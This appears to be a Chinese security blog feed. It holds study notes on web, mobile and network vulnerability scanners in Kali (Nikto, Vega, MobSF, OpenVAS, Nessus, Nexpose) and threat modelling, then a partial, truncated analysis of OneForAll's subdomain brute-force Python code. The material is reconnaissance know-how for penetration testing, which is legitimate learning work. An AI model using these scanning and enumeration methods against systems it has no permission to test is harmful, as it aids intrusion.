Web应用漏洞扫描器</h1><p>漏洞扫描器具有所有扫描器沟通的缺点(只能检测已知漏洞的签名，且误报率较高)</p><p>Kali针对Web服务器配有大量漏洞扫描器，并为安装新的扫描器和扩展其能力提供了稳定的平台。测试人员可以通过选择扫描工具来提高测试的有效性：</p><ul><li>最大限制的完整性和测试精度</li><li>尽量减少获得可用的结果所需的时间</li><li>尽量减少对被检测网络服务的负面影响</li></ul><p>Kali提供几种不同的漏洞扫描器，主要如下：</p><ul><li>扩展了传统漏洞扫描程序的功能，包括网站和关联服务(例如：Metasploit框架和Websploit)的扫描器</li><li>拓展了非传统的应用功能，如Web浏览器，支持Web服务漏洞扫描(OWASP Mantra)的扫描器</li><li>专门开发用于支持对网站和网页服务的侦察和利用检测(Arachnid、Nikto、Skipfish、Vega、w3af等)的扫描器</li></ul><h2 id="4-1-Nikto和Vega简介"><a href="#4-1-Nikto和Vega简介" class="headerlink" title="4.1 Nikto和Vega简介"></a>4.1 Nikto和Vega简介</h2><p>Nikto是一个简单的扫描器，通常提供准确但有限的结果</p><p>使用命令<code>nikto -h IP/URL -p Port</code></p><p><img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/20210927141404.png" alt="nikto 示例"></p><p>基于验证发现漏洞数量的、最有效的扫描器之一是Subgraph Vega，它会扫描目标，并将漏洞分级为高、中、低和信息性的。为了得到特定的结果，该测试器能够点击确定结果为“drill down”（深入）。该测试器还可以修改搜索模块，这是用Java编写的，专注于特定的漏洞或找出新的安全漏洞</p><p>现在Kali没有预备安装了，需要到<a href="https://github.com/subgraph/Vega%E8%BF%9B%E8%A1%8C%E4%B8%8B%E8%BD%BD%E5%AE%89%E8%A3%85">https://github.com/subgraph/Vega进行下载安装</a></p><p>解压后命令<code>./Vega</code>即可运行</p><p>使用教程<a href="https://www.cnblogs.com/zixuanfy/p/5988716.html">参考</a></p><h1 id="5-移动应用漏洞扫描器"><a href="#5-移动应用漏洞扫描器" class="headerlink" title="5. 移动应用漏洞扫描器"></a>5. 移动应用漏洞扫描器</h1><p>本节中介绍设置移动应用程序扫描器，以及如何将移动应用程序扫描器的结果组合在一起，并利用信息来识别更多的漏洞，以实现渗透测试的目标</p><p><strong>移动安全框架</strong>(Mobile Security Framework, MobSF)是针对所有移动平台(包括Android、IOS和Windows)的开源自动渗透测试框架。框架是用Djiango Python框架编写的</p><p>框架下载地址：<a href="https://github.com/MobSF/Mobile-Security-Framework-MobSF">https://github.com/MobSF/Mobile-Security-Framework-MobSF</a></p><p>解压后进入对应的文件夹下，输入以下命令<code>python3 -m pip install -r requirements.txt</code></p><p>一切准备就绪后，使用命令<code>python3 manage.py test</code>来测试配置</p><p>转移应用程序安装<code>python manage.py migrate</code></p><p>漏洞扫描命令<code>python3 manage.py runserver 192.168.66.1:8000</code></p><p>在浏览器中访问<a href="http://yourIPaddress:Portnumber，将侦察期间发现的任何移动应用程序上传到扫描器，用于识别入口点。">http://yourIPaddress:Portnumber，将侦察期间发现的任何移动应用程序上传到扫描器，用于识别入口点。</a></p><p>一旦文件上传，渗透测试人员可以识别扫描器的配置文件以及所有其他重要信息!</p><p>扫描结果可以提供所有的移动应用配置信息，例如活动、服务、接收者、提供者等。这些配置信息有时还包括可用于其他鉴别服务和漏洞的硬编码凭据或云API密钥。在渗透测试练习时，我们在目标移动应用的一个Java文件的注释中发现了一个开发者账号和base64密码，有了这些信息就可以访问该机构的外部VPN了。移动安全框架的核心部分在URL、恶意软件和字符串中。</p><p><strong>（安装过程中始终出现问题无法成功安装。暂时跳过）</strong></p><h1 id="6-网络漏洞扫描器OpenVAS"><a href="#6-网络漏洞扫描器OpenVAS" class="headerlink" title="6. 网络漏洞扫描器OpenVAS"></a>6. 网络漏洞扫描器OpenVAS</h1><p><strong>开放漏洞评估系统</strong>(Open Vulnerability AssessmentSystem，OpenVAS)是一个开源的漏洞评估扫描器，也是攻击者通常用来大规模扫描网络的漏洞管理工具，其中大约包括有47 000个漏洞的数据库</p><p>安装命令<code>apt-get install openvas</code></p><p>安装完成后，运行<code>openvas-setup</code>(现在OpenVAS更名为了GVM（Greenbone Vulnerability Management）命令同样更新为<code>gvm-setup</code>)命令安装依赖OpenVAS。为了确保安装可行，可以运行<code>openvas-check-setup</code>(更新为<code>gvm-check-setup</code>)命令，它会列出有效运行OpenVAS所需的前10个项目</p><p><img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/20210928122614.png" alt="gvm-check-set"></p><p>来设置管理员用户密码信息会在<code>gvm-setup</code>命令的末尾显示</p><p><code>gvm-feed-update</code>更新数据库</p><p>并通过<code>openvar-start</code>(<code>gvm-start</code>)命令启动。启动后访问<a href="https://localhost:9392端口即可看到服务命令`gvm-stop`停止服务">https://localhost:9392端口即可看到服务命令`gvm-stop`停止服务</a></p><p><img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/20210928150618.png" alt="openvas"></p><p>登录信息是刚才设置的内容</p><p>如果想不通过localhost来进行访问参考<a href="https://blog.csdn.net/weixin_42344757/article/details/109648600">链接</a></p><p>实际操作流程如下即可</p><blockquote><p>vi /lib/systemd/system/greenbone-security-assistant.service</p><p>将其中127.0.0.1的部分修改为0.0.0.0，然后保存</p><p>systemctl daemon-reload<br> 启动服务</p><p>gvm-start</p></blockquote><p>与其他扫描器不同的是，OpenVAS还可以自定义扫描配置，它允许测试人员添加凭证，禁用特定的插件，并设置可以进行的最大和最小连接数等</p><h1 id="7-商业漏洞扫描器"><a href="#7-商业漏洞扫描器" class="headerlink" title="7. 商业漏洞扫描器"></a>7. 商业漏洞扫描器</h1><p>商业漏洞扫描器此处主要介绍Nessus和Nexpose</p><p>此处仅简单介绍安装流程，具体内容请参考对应的综合文档</p><h2 id="7-1-Nessus"><a href="#7-1-Nessus" class="headerlink" title="7.1 Nessus"></a>7.1 Nessus</h2><p>在Kali上的安装步骤为：</p><ol><li>访问<a href="https://www.tenable.com/try%E7%BD%91%E7%AB%99%E5%B9%B6%E6%B3%A8%E5%86%8C%E4%B8%BA%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7%EF%BC%8C%E7%84%B6%E5%90%8E%E9%80%89%E6%8B%A9Try">https://www.tenable.com/try网站并注册为普通用户，然后选择Try</a> Nessus Professional Free（免费试用Nessus专业版）</li><li>从<a href="https://www.tenable.com/downloads/%E7%BD%91%E7%AB%99%E4%B8%8B%E8%BD%BD%E5%AF%B9%E5%BA%94%E7%9A%84Nessus%E7%89%88%E6%9C%AC">https://www.tenable.com/downloads/网站下载对应的Nessus版本</a></li><li>下载完成后，通过以下命令进行安装：<code>dpkg -i Nessus-8.1.2-debian6_amd64.deb</code></li><li>接着通过运行service nessusd start开启nessus服务，然后Nessus就在系统中启动了</li><li>默认情况下，Nessus扫描器的运行端口是SSL的8834号端口</li><li>添加一个新用户并激活注册码。扫描器将根据注册码下载所有相关插件</li><li>最后，将看到Nessus的运行界面，此时可以对目标系统或网络实施扫描了</li></ol><h2 id="7-2-Nexpose"><a href="#7-2-Nexpose" class="headerlink" title="7.2 Nexpose"></a>7.2 Nexpose</h2><p>在Kali上的安装步骤为：</p><ol><li>注册Rapid 7账号（<a href="https://www.rapid7.com/products/nexpose/request/%EF%BC%89%EF%BC%8C%E9%9C%80%E8%A6%81%E4%B8%80%E4%B8%AA%E6%9C%89%E6%95%88%E7%9A%84%E5%95%86%E4%B8%9A%E7%94%B5%E5%AD%90%E9%82%AE%E7%AE%B1%E6%9D%A5%E6%8E%A5%E6%94%B6%E6%BF%80%E6%B4%BB%E7%A0%81">https://www.rapid7.com/products/nexpose/request/），需要一个有效的商业电子邮箱来接收激活码</a></li><li>运行以下代码，从官网下载安装包<code>wget http://download2.rapid7.com/download/InsightVM/Rapid7Setup-Linux64.bin</code>之后赋予编译文件权限，根据扫描器要求输入信息即可</li><li>默认情况下，Nexpose运行端口为SSL的3780号端口。所以能通过<a href="https://localhost:3780/%E8%AE%BF%E9%97%AENexpose">https://localhost:3780/访问Nexpose</a></li><li>同样，Nexpose也会根据注册码下载所有插件，随后可以登录Nexpose漏洞扫描器了</li></ol><h1 id="8-专业扫描器"><a href="#8-专业扫描器" class="headerlink" title="8. 专业扫描器"></a>8. 专业扫描器</h1><p>杀链的利用阶段是最危险的，渗透测试人员直接与目标网络或系统交互，他们的活动很可能被记录，且身份大概率被发现。因此使用秘密技术来减少测试人员暴露的风险是有必要的。虽然没有具体的方法或工具可以确定未被检测，但是改变配置以及利用特别的工具是应该做的</p><p>此处介绍另一个值得使用的扫描器Web应用程序攻击和审计框架（Web Application Attack and Audit Framework，w3af）</p><p>在安装过程中卡在了<code>./w3af_console</code>一直提示We recommend you install pip before continuing.但是已经安装了pip。疑惑！！</p><h1 id="9-威胁建模"><a href="#9-威胁建模" class="headerlink" title="9. 威胁建模"></a>9. 威胁建模</h1><p>威胁建模：最初是由网络规划者发展起来的，制定针对攻击的防御对策的过程</p><p>渗透测试人员需要不断寻找防御威胁建模方法来提高攻击的成功率。攻击威胁建模是制定攻击策略的一个较为常见的手段，它将侦察和研究的结果相结合。攻击者必须充分考虑现有的目标，并确定目标是以下何种类型：</p><ul><li>首要目标：这些是任何组织的入口点目标。当这些目标被击垮时，它们将直接帮助攻击者达到目的</li><li>次要目标：这些目标可以提供信息（安全控制、密码、登录政策、以及本地和域管理员的用户名和密码）以支持对首要目标进行攻击或访问</li><li>第三目标：这些目标可能与测试或攻击对象无关，但是相对容易攻击，有可能为实际攻击提供信息或者其他思路</li></ul><p>一般情况下攻击者创建威胁模型时，遵循下图所示的攻击树方法</p><p><img src="https://res.weread.qq.com/wrepub/epub_33211566_198" alt="威胁模型攻击树"></p><p>攻击树方法为测试者查看可用的攻击选项提供了便利，如果一个攻击方案没有成功，也可以快速找到替代方案</p>]]></content>
    
    
    <categories>
      
      <category>书籍 Kali高级渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>kali高级渗透测试</tag>
      
      <tag>书籍</tag>
      
      <tag>漏洞探测</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>OneForAll代码分析-4</title>
    <link href="/2021/09/14/%E4%BF%A1%E5%AE%89/%E5%B7%A5%E5%85%B7%E5%88%86%E6%9E%90/OneForAll/OneForAll%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-4/"/>
    <url>/2021/09/14/%E4%BF%A1%E5%AE%89/%E5%B7%A5%E5%85%B7%E5%88%86%E6%9E%90/OneForAll/OneForAll%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-4/</url>
    
    <content type="html"><![CDATA[<h1 id="OneForAll代码分析-4"><a href="#OneForAll代码分析-4" class="headerlink" title="OneForAll代码分析-4"></a>OneForAll代码分析-4</h1><p>承接2中的内容对brute模块进行分析</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">gen_subdomains</span>(<span class="hljs-params">expression, path</span>):</span><br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    Generate subdomains</span><br><span class="hljs-string"></span><br><span class="hljs-string">    :param  str  expression: generate subdomains expression</span><br><span class="hljs-string">    :param  str  path: path of wordlist</span><br><span class="hljs-string">    :return set  subdomains: list of subdomains</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    subdomains = <span class="hljs-built_in">set</span>()<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(path, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>, errors=<span class="hljs-string">&#x27;ignore&#x27;</span>) <span class="hljs-keyword">as</span> fd:<br>        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> fd:<br>            word = line.strip().lower()<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(word) == <span class="hljs-number">0</span>:<br>                <span class="hljs-keyword">continue</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> utils.is_subname(word):<br>                <span class="hljs-keyword">continue</span><br>            <span class="hljs-keyword">if</span> word.startswith(<span class="hljs-string">&#x27;.&#x27;</span>):<br>                word = word[<span class="hljs-number">1</span>:]<br>            <span class="hljs-keyword">if</span> word.endswith(<span class="hljs-string">&#x27;.&#x27;</span>):<br>                word = word[:-<span class="hljs-number">1</span>]<br>            subdomain = expression.replace(<span class="hljs-string">&#x27;*&#x27;</span>, word)<br>            subdomains.add(subdomain)<br>    size = <span class="hljs-built_in">len</span>(subdomains)<br>    logger.log(<span class="hljs-string">&#x27;DEBUG&#x27;</span>, <span class="hljs-string">f&#x27;The size of the dictionary generated by <span class="hljs-subst">&#123;path&#125;</span> is <span class="hljs-subst">&#123;size&#125;</span>&#x27;</span>)<br>    <span class="hljs-keyword">if</span> size == <span class="hljs-number">0</span>:<br>        logger.log(<span class="hljs-string">&#x27;ALERT&#x27;</span>, <span class="hljs-string">&#x27;Please check the dictionary content!&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        utils.check_random_subdomain(subdomains)<br>    <span class="hljs-keyword">return</span> subdomains<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">gen_fuzz_subdomains</span>(<span class="hljs-params">expression, rule, fuzzlist</span>):</span><br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    Generate subdomains based on fuzz mode</span><br><span class="hljs-string"></span><br><span class="hljs-string">    :param  str  expression: generate subdomains expression</span><br><span class="hljs-string">    :param  str  rule: regexp rule</span><br><span class="hljs-string">    :param  str  fuzzlist: fuzz dictionary</span><br><span class="hljs-string">    :return set  subdomains: list of subdomains</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    subdomains = <span class="hljs-built_in">set</span>()<br>    <span class="hljs-keyword">if</span> fuzzlist:<br>        fuzz_domain = gen_subdomains(expression, fuzzlist)<br>        subdomains.update(fuzz_domain)<br>    <span class="hljs-keyword">if</span> rule:<br>        fuzz_count = exrex.count(rule)<br>        <span class="hljs-keyword">if</span> fuzz_count &gt; <span class="hljs-number">10000000</span>:<br>            logger.log(<span class="hljs-string">&#x27;ALERT&#x27;</span>, <span class="hljs-string">f&#x27;The dictionary generated by this rule is too large: &#x27;</span><br>                                <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;fuzz_count&#125;</span> &gt; 10000000&#x27;</span>)<br>        <span class="hljs-keyword">for</span> fuzz_string <span class="hljs-keyword">in</span> exrex.generate(rule):<br>            fuzz_string = fuzz_string.lower()<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> fuzz_string.isalnum():<br>                <span class="hljs-keyword">continue</span><br>            fuzz_domain = expression.replace(<span class="hljs-string">&#x27;*&#x27;</span>, fuzz_string)<br>            subdomains.add(fuzz_domain)<br>        utils.check_random_subdomain(subdomains)<br>    logger.log(<span class="hljs-string">&#x27;DEBUG&#x27;</span>, <span class="hljs-string">f&#x27;Dictionary size based on fuzz mode: <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(subdomains)&#125;</span>&#x27;</span>)<br>    <span class="hljs-keyword">return</span> subdomains<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">gen_word_subdomains</span>(<span class="hljs-params">expression, path</span>):</span><br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    Generate subdomains based on word mode</span><br><span class="hljs-string"></span><br><span class="hljs-string">    :param  str  expression: generate subdomains expression</span><br><span class="hljs-string">    :param  str  path: path of wordlist</span><br><span class="hljs-string">    :return set  subdomains: list of subdomains</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    subdomains = gen_subdomains(expression, path)<br>    logger.log(<span class="hljs-string">&#x27;DEBUG&#x27;</span>, <span class="hljs-string">f&#x27;Dictionary based on word mode size: <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(subdomains)&#125;</span>&#x27;</span>)<br>    <span class="hljs-keyword">return</span> subdomains<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">query_domain_ns_a</span>(<span class="hljs-params">ns_list</span>):</span><br>    logger.log(<span class="hljs-string">&#x27;INFOR&#x27;</span>, <span class="hljs-string">f&#x27;Querying A record from authoritative name server: <span class="hljs-subst">&#123;ns_list&#125;</span> &#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(ns_list, <span class="hljs-built_in">list</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">list</span>()<br>    ns_ip_list = []<br>    resolver = utils.dns_resolver()<br>    <span class="hljs-keyword">for</span> ns <span class="hljs-keyword">in</span> ns_list:<br>        <span class="hljs-keyword">try</span>:<br>            answer = resolver.query(ns, <span class="hljs-string">&#x27;A&#x27;</span>)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            logger.log(<span class="hljs-string">&#x27;ERROR&#x27;</span>, e.args)<br>            logger.log(<span class="hljs-string">&#x27;ERROR&#x27;</span>, <span class="hljs-string">f&#x27;Query authoritative name server <span class="hljs-subst">&#123;ns&#125;</span> A record error&#x27;</span>)<br>            <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">if</span> answer:<br>            <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> answer:<br>                ns_ip_list.append(item.address)<br>    logger.log(<span class="hljs-string">&#x27;INFOR&#x27;</span>, <span class="hljs-string">f&#x27;Authoritative name server A record result: <span class="hljs-subst">&#123;ns_ip_list&#125;</span>&#x27;</span>)<br>    <span class="hljs-keyword">return</span> ns_ip_list<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">query_domain_ns</span>(<span class="hljs-params">domain</span>):</span><br>    logger.log(<span class="hljs-string">&#x27;INFOR&#x27;</span>, <span class="hljs-string">f&#x27;Querying NS records of <span class="hljs-subst">&#123;domain&#125;</span>&#x27;</span>)<br>    domain = utils.get_main_domain(domain)<br>    resolver = utils.dns_resolver()<br>    <span class="hljs-keyword">try</span>:<br>        answer = resolver.query(domain, <span class="hljs-string">&#x27;NS&#x27;</span>)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        logger.log(<span class="hljs-string">&#x27;ERROR&#x27;</span>, e.args)<br>        logger.log(<span class="hljs-string">&#x27;ERROR&#x27;</span>, <span class="hljs-string">f&#x27;Querying NS records of <span class="hljs-subst">&#123;domain&#125;</span> error&#x27;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">list</span>()<br>    ns = [item.to_text() <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> answer]<br>    logger.log(<span class="hljs-string">&#x27;INFOR&#x27;</span>, <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;domain&#125;</span>\&#x27;s authoritative name server is <span class="hljs-subst">&#123;ns&#125;</span>&#x27;</span>)<br>    <span class="hljs-keyword">return</span> ns<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">check_dict</span>():</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> settings.enable_check_dict:<br>        <span 